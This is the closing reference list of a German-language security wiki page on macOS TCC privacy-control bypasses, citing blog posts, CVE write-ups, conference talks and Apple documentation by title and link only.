- [6] [Wo auf der Welt ist Carmen Sandiego: Location Services unter macOS missbrauchen](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC-bypass stiehlt Daten aus iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (Umgebungsvariablen von SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Entitlement zum Zulassen von DYLD-Umgebungsvariablen](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarisierung: die hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day-TCC-bypass in XCSSET-Malware entdeckt](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: „Was auf deinem Mac passiert, bleibt in Apples iCloud?!“ - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [Neue macOS-Schwachstelle „powerdir“ könnte zu unbefugtem Zugriff auf Benutzerdaten führen](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Home-Verzeichnis ändern und TCC umgehen, auch bekannt als CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Musik abspielen und TCC umgehen, auch bekannt als CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - TCC mit Telegram unter macOS umgehen](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Aufdeckung von Apple-Schwachstellen: Audit von diskarbitrationd und storagekitd, Teil 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
